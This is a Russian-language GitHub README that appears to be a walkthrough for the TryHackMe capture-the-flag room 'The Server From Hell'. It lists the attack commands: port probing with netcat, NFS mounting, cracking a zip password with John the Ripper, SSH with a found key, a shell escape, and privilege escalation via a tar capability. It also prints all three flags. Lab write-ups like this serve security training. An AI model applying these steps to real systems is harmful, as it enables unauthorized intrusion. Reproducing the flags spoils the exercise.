[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [The Server From Hell](https://tryhackme.com/r/room/theserverfromhell) 

Всего 1 заданиe:
## Задание 1
Начните с порта 1337 и продолжайте нумерацию.
Удачи.

### Ответьте на вопросы ниже
флаг.txt
```commandline
nc <IP> 1337
for i in {1..100};do nc <IP> $i;echo "";done
nc <IP> 12345
nmap -sC -sV -p111,2049 <IP>
mkdir nfs  
sudo mount -t nfs <ip>: nfs           
tree nfs
zipinfo backup.zip
zip2john backup.zip > backup.hash
john backup.hash --wordlist=/usr/share/wordlists/rockyou.txt
cat flag.txt
```
```commandline
thm{h0p3_y0u_l1k3d_th3_f1r3w4ll}
```
пользователь.txt
```commandline
cat hint.txt
nmap -sV -p 2500-4500 <IP> | grep -i ssh
chmod 600 id_rsa
ssh -i id_rsa hades@<IP> -p 3333
exec '/bin/bash'
cat user.txt
```
```commandline
thm{sh3ll_3c4p3_15_v3ry_1337}
```
корень.txt
```commandline
getcap -r / 2>/dev/null
tar -cvf flag.tar /root/root.txt
tar xf flag.tar 
cat root/root.txt
```
```commandline
thm{w0w_n1c3_3sc4l4t10n}
```


[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)